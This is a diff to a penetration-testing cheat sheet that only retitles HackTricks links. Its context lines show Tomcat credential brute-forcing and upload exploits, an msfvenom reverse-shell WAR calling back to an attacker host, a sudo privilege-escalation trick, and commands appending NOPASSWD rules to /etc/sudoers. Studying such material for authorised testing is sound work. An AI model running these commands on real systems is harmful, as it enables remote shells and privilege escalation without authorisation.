@@ -147,7 +147,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.
 ```
 
 ### Apache Tomcat
-- [Tomcat Default Structure](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info#default-structure)
+- [Tomcat Default Structure - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info#default-structure)
 ```bash
 # Brute forcing default credentials
 msf> use auxiliary/scanner/http/tomcat_mgr_login
@@ -159,7 +159,7 @@ msf> use exploit/multi/http/tomcat_mgr_upload
 # Upload the revshell.war file and access to it (/revshell/)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
 ```
-> - [HackTricks: Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
+> - [Tomcat - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
 > - https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/
 
 
@@ -289,7 +289,7 @@ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.
 # If the sudo version is < 1.28, try the following command for LPE
 sudo -u#-1 /bin/bash
 ```
-> - [HackTricks: Sudo Version](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version)
+> - [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version)
 
 ### As Another Users
 ```bash
@@ -307,7 +307,7 @@ sudo -u testuser /bin/bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 ```
-> - [HackTricks: Edit Sudoers](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d)
+> - [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d)
 
 ### Command Forgery (NOPASSWD)
 ```bash
